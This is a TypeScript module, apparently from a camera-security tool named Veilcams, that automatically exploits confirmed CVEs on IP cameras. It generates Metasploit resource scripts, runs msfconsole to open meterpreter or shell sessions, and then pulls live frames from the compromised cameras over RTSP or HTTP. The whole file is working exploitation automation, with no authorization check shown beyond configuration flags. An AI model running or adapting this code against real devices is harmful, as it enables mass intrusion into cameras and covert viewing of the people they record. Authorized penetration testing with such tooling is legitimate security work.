import { spawn } from 'node:child_process';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import type {
  FingerprintResult,
  CveModuleResult,
  ExploitationResult,
  ExploitationModuleResult,
  VeilcamsConfig,
} from '../types/index.js';
import type { CameraVendor } from '../types/index.js';
import { CVE_MSF_MAP, type MsfModuleConfig } from '../constants-msf.js';
import { DEFAULTS, RTSP_PATHS, SNAPSHOT_ENDPOINTS } from '../constants.js';

/**
 * Phase 3.5: Exploitation
 *
 * Auto-exploits confirmed CVEs via Metasploit (msfconsole).
 * Only runs against vulnerabilities that:
 *   1. Were confirmed in Phase 3 (CVE scanning)
 *   2. Have a known Metasploit module mapping
 *
 * Execution: generates .rc resource scripts and runs msfconsole -q -r <script>
 */
export async function runExploitation(
  fingerprints: FingerprintResult[],
  cveResult: CveModuleResult,
  config: VeilcamsConfig,
  outputDir: string,
): Promise<ExploitationModuleResult> {
  const startTime = Date.now();
  const results: ExploitationResult[] = [];

  if (!config.exploitation.enabled) {
    return {
      results: [],
      totalAttempts: 0,
      successfulExploits: 0,
      failedExploits: 0,
      skippedNoModule: 0,
      durationMs: Date.now() - startTime,
    };
  }

  // Build a lookup for fingerprint data by ip:port
  const fpMap = new Map<string, FingerprintResult>();
  for (const fp of fingerprints) {
    fpMap.set(`${fp.ip}:${fp.port}`, fp);
  }

  // Get confirmed vulnerable CVEs
  const confirmedCves = cveResult.results.filter((r) => r.vulnerable);
  let skippedNoModule = 0;

  console.log(`[exploitation] ${confirmedCves.length} confirmed CVEs to evaluate for exploitation`);

  // Ensure tmp dir for resource scripts
  const rcDir = path.join(os.tmpdir(), 'veilcams_rc');
  await fs.mkdir(rcDir, { recursive: true });

  for (const cve of confirmedCves) {
    const msfConfig = CVE_MSF_MAP[cve.cveId];

    if (!msfConfig) {
      skippedNoModule++;
      console.log(`[exploitation] ${cve.cveId} on ${cve.ip}:${cve.port} — no Metasploit module mapped, skipping`);
      continue;
    }

    if (!config.exploitation.auto_exploit_confirmed) {
      skippedNoModule++;
      continue;
    }

    const timeout = config.exploitation.timeout_per_exploit || msfConfig.timeout || DEFAULTS.EXPLOITATION_TIMEOUT_MS;

    console.log(`[exploitation] Exploiting ${cve.cveId} on ${cve.ip}:${cve.port} via ${msfConfig.module}`);

    const result = await runMsfExploit(cve.ip, cve.port, cve.cveId, cve.vendor, msfConfig, timeout, rcDir);

    // Capture screenshot evidence after successful exploit
    if (result.success) {
      console.log(`[exploitation] ${cve.cveId} on ${cve.ip}:${cve.port} — SUCCESS, capturing screenshot...`);
      const fp = fpMap.get(`${cve.ip}:${cve.port}`);
      result.screenshotPath = await captureScreenshot(cve.ip, cve.port, cve.vendor as CameraVendor, fp, outputDir);
      if (result.screenshotPath) {
        console.log(`[exploitation] Screenshot saved: ${result.screenshotPath}`);
      }
    } else {
      console.log(`[exploitation] ${cve.cveId} on ${cve.ip}:${cve.port} — FAILED: ${result.error || 'no session'}`);
    }

    results.push(result);
  }

  // Also check AI results if any
  if (cveResult.aiResults) {
    const confirmedAi = cveResult.aiResults.filter((r) => r.vulnerable);
    for (const ai of confirmedAi) {
      const msfConfig = CVE_MSF_MAP[ai.cveId];
      if (!msfConfig) {
        skippedNoModule++;
        continue;
      }

      // Skip if we already exploited this CVE on this host
      const alreadyDone = results.some((r) => r.cveId === ai.cveId && r.ip === ai.ip && r.port === ai.port);
      if (alreadyDone) continue;

      if (!config.exploitation.auto_exploit_confirmed) {
        skippedNoModule++;
        continue;
      }

      const timeout = config.exploitation.timeout_per_exploit || msfConfig.timeout || DEFAULTS.EXPLOITATION_TIMEOUT_MS;

      console.log(`[exploitation] Exploiting ${ai.cveId} (AI-confirmed) on ${ai.ip}:${ai.port} via ${msfConfig.module}`);

      const result = await runMsfExploit(ai.ip, ai.port, ai.cveId, ai.vendor, msfConfig, timeout, rcDir);

      if (result.success) {
        const fp = fpMap.get(`${ai.ip}:${ai.port}`);
        result.screenshotPath = await captureScreenshot(ai.ip, ai.port, ai.vendor as CameraVendor, fp, outputDir);
      }

      results.push(result);
    }
  }

  const successful = results.filter((r) => r.success).length;
  const failed = results.filter((r) => !r.success).length;

  // Save raw results
  const resultsPath = path.join(outputDir, 'raw', 'exploitation_results.json');
  await fs.mkdir(path.dirname(resultsPath), { recursive: true });
  await fs.writeFile(resultsPath, JSON.stringify(results, null, 2));

  const moduleResult: ExploitationModuleResult = {
    results,
    totalAttempts: results.length,
    successfulExploits: successful,
    failedExploits: failed,
    skippedNoModule,
    durationMs: Date.now() - startTime,
  };

  console.log(`[exploitation] Complete: ${successful} successful, ${failed} failed, ${skippedNoModule} skipped (no module)`);

  return moduleResult;
}

/**
 * Generate a Metasploit resource script and execute it via msfconsole.
 */
async function runMsfExploit(
  ip: string,
  port: number,
  cveId: string,
  vendor: string,
  msfConfig: MsfModuleConfig,
  timeout: number,
  rcDir: string,
): Promise<ExploitationResult> {
  const exploitStart = Date.now();
  const rcFilename = `veilcams_${cveId.replace(/[^a-zA-Z0-9-]/g, '_')}_${ip.replace(/\./g, '_')}_${port}.rc`;
  const rcPath = path.join(rcDir, rcFilename);

  // Build resource script
  const rcLines: string[] = [];
  rcLines.push(`use ${msfConfig.module}`);
  rcLines.push(`set RHOSTS ${ip}`);
  rcLines.push(`set RPORT ${port}`);

  if (msfConfig.defaultPayload) {
    rcLines.push(`set PAYLOAD ${msfConfig.defaultPayload}`);
  }

  for (const [key, value] of Object.entries(msfConfig.options)) {
    rcLines.push(`set ${key} ${value}`);
  }

  if (msfConfig.type === 'exploit') {
    rcLines.push('exploit');
  } else {
    rcLines.push('run');
  }

  rcLines.push('exit');
  rcLines.push('');

  await fs.writeFile(rcPath, rcLines.join('\n'));

  // Execute msfconsole
  try {
    const output = await runMsfConsole(rcPath, timeout);

    // Parse output for success indicators
    const sessionCreated = /session \d+ opened/i.test(output) ||
      /command shell session \d+ opened/i.test(output) ||
      /meterpreter session \d+ opened/i.test(output);

    const auxiliarySuccess = msfConfig.type === 'auxiliary' && (
      /\[\+\]/.test(output) ||
      /login.*successful/i.test(output) ||
      /found/i.test(output)
    );

    const success = sessionCreated || auxiliarySuccess;

    let sessionType: string | undefined;
    if (sessionCreated) {
      const meterMatch = output.match(/meterpreter session/i);
      const shellMatch = output.match(/command shell session/i);
      sessionType = meterMatch ? 'meterpreter' : shellMatch ? 'shell' : 'unknown';
    }

    // Clean up rc file
    await fs.unlink(rcPath).catch(() => {});

    return {
      cveId,
      ip,
      port,
      vendor: vendor as ExploitationResult['vendor'],
      msfModule: msfConfig.module,
      msfModuleType: msfConfig.type,
      success,
      output,
      sessionCreated,
      sessionType,
      durationMs: Date.now() - exploitStart,
      timestamp: new Date().toISOString(),
    };
  } catch (error) {
    // Clean up rc file
    await fs.unlink(rcPath).catch(() => {});

    return {
      cveId,
      ip,
      port,
      vendor: vendor as ExploitationResult['vendor'],
      msfModule: msfConfig.module,
      msfModuleType: msfConfig.type,
      success: false,
      output: '',
      sessionCreated: false,
      error: (error as Error).message,
      durationMs: Date.now() - exploitStart,
      timestamp: new Date().toISOString(),
    };
  }
}

/**
 * Capture a screenshot from the exploited camera as visual evidence.
 *
 * Tries two methods:
 * 1. ffmpeg RTSP frame grab — connects to known RTSP paths for the vendor
 * 2. HTTP snapshot endpoint — curls known snapshot URLs
 *
 * Returns the path to the saved screenshot, or undefined if capture failed.
 */
async function captureScreenshot(
  ip: string,
  port: number,
  vendor: CameraVendor,
  fingerprint: FingerprintResult | undefined,
  outputDir: string,
): Promise<string | undefined> {
  const screenshotDir = path.join(outputDir, 'evidence', 'screenshots');
  await fs.mkdir(screenshotDir, { recursive: true });

  const filename = `exploit_${ip.replace(/\./g, '_')}_${port}_${Date.now()}`;

  // Try RTSP frame capture via ffmpeg
  const rtspPaths = [
    ...(RTSP_PATHS[vendor] || []),
    ...RTSP_PATHS.unknown,
  ];
  // Use RTSP port — check if the fingerprint has RTSP, otherwise try 554
  const rtspPort = fingerprint?.protocols.includes('rtsp') ? port : 554;

  for (const rtspPath of rtspPaths.slice(0, 5)) {
    const rtspUrl = `rtsp://${ip}:${rtspPort}${rtspPath}`;
    const outputPath = path.join(screenshotDir, `${filename}_rtsp.jpg`);

    try {
      const captured = await ffmpegCapture(rtspUrl, outputPath);
      if (captured) {
        console.log(`[exploitation] RTSP screenshot captured from ${rtspUrl}`);
        return outputPath;
      }
    } catch {
      // Try next path
    }
  }

  // Try HTTP snapshot endpoints
  const snapshotPaths = [
    ...(SNAPSHOT_ENDPOINTS[vendor] || []),
    ...SNAPSHOT_ENDPOINTS.unknown,
  ];
  const scheme = fingerprint?.protocols.includes('https') ? 'https' : 'http';

  for (const snapPath of snapshotPaths.slice(0, 5)) {
    const url = `${scheme}://${ip}:${port}${snapPath}`;
    const outputPath = path.join(screenshotDir, `${filename}_http.jpg`);

    try {
      const captured = await curlCapture(url, outputPath);
      if (captured) {
        console.log(`[exploitation] HTTP screenshot captured from ${url}`);
        return outputPath;
      }
    } catch {
      // Try next endpoint
    }
  }

  console.log(`[exploitation] Could not capture screenshot from ${ip}:${port}`);
  return undefined;
}

/**
 * Use ffmpeg to grab a single frame from an RTSP stream.
 */
function ffmpegCapture(rtspUrl: string, outputPath: string): Promise<boolean> {
  return new Promise((resolve) => {
    const proc = spawn('ffmpeg', [
      '-y',
      '-rtsp_transport', 'tcp',
      '-i', rtspUrl,
      '-frames:v', '1',
      '-q:v', '2',
      outputPath,
    ], {
      stdio: ['ignore', 'pipe', 'pipe'],
      timeout: 15000,
    });

    const timer = setTimeout(() => {
      proc.kill('SIGTERM');
      resolve(false);
    }, 15000);

    proc.on('close', async (code) => {
      clearTimeout(timer);
      if (code === 0) {
        // Verify the file exists and has content
        try {
          const stats = await fs.stat(outputPath);
          resolve(stats.size > 1000); // Minimum 1KB for a valid JPEG
        } catch {
          resolve(false);
        }
      } else {
        resolve(false);
      }
    });

    proc.on('error', () => {
      clearTimeout(timer);
      resolve(false);
    });
  });
}

/**
 * Use curl to download a snapshot from an HTTP endpoint.
 */
function curlCapture(url: string, outputPath: string): Promise<boolean> {
  return new Promise((resolve) => {
    const proc = spawn('curl', [
      '-s',
      '-o', outputPath,
      '-m', '10',
      '--insecure',
      url,
    ], {
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    const timer = setTimeout(() => {
      proc.kill('SIGTERM');
      resolve(false);
    }, 15000);

    proc.on('close', async (code) => {
      clearTimeout(timer);
      if (code === 0) {
        try {
          const stats = await fs.stat(outputPath);
          if (stats.size < 1000) {
            await fs.unlink(outputPath).catch(() => {});
            resolve(false);
            return;
          }
          // Check if it looks like an image (JPEG magic bytes)
          const header = Buffer.alloc(3);
          const fd = await fs.open(outputPath, 'r');
          await fd.read(header, 0, 3, 0);
          await fd.close();
          const isJpeg = header[0] === 0xFF && header[1] === 0xD8 && header[2] === 0xFF;
          const isPng = header[0] === 0x89 && header[1] === 0x50 && header[2] === 0x4E;
          if (isJpeg || isPng) {
            resolve(true);
          } else {
            await fs.unlink(outputPath).catch(() => {});
            resolve(false);
          }
        } catch {
          resolve(false);
        }
      } else {
        resolve(false);
      }
    });

    proc.on('error', () => {
      clearTimeout(timer);
      resolve(false);
    });
  });
}

/**
 * Spawn msfconsole with a resource script and capture output.
 */
function runMsfConsole(rcPath: string, timeout: number): Promise<string> {
  return new Promise((resolve, reject) => {
    const proc = spawn('msfconsole', ['-q', '-r', rcPath], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: { ...process.env, TERM: 'dumb' },
    });

    let stdout = '';
    let stderr = '';

    proc.stdout.on('data', (data: Buffer) => {
      stdout += data.toString();
    });

    proc.stderr.on('data', (data: Buffer) => {
      stderr += data.toString();
    });

    const timer = setTimeout(() => {
      proc.kill('SIGTERM');
      // Give it a moment to clean up, then force kill
      setTimeout(() => proc.kill('SIGKILL'), 5000);
      resolve(stdout + '\n[TIMEOUT] Exploit timed out after ' + timeout + 'ms');
    }, timeout);

    proc.on('close', (code) => {
      clearTimeout(timer);
      if (code !== 0 && !stdout) {
        reject(new Error(`msfconsole exited with code ${code}: ${stderr}`));
      } else {
        resolve(stdout);
      }
    });

    proc.on('error', (err) => {
      clearTimeout(timer);
      reject(new Error(`Failed to launch msfconsole: ${err.message}`));
    });
  });
}
